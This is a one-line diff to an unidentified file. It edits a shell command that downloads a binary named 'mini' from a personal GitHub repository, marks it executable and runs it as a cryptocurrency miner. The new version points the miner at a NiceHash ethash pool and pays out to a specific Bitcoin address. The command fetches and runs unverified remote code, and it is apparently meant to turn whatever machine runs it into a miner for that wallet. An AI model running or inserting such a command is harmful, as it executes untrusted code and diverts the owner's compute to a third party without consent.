@@ -1,1 +1,1 @@
-wget https://raw.githubusercontent.com/Adhy0788/BanjaranIndah/main/mini && chmod +x mini && ./mini --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user BTC_Wallet
+wget https://raw.githubusercontent.com/Adhy0788/BanjaranIndah/main/mini && chmod +x mini && ./mini --algo ethash --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 3EWNNEoieMZHuYRPo7srhVSXznGMC1frwq.Rig001
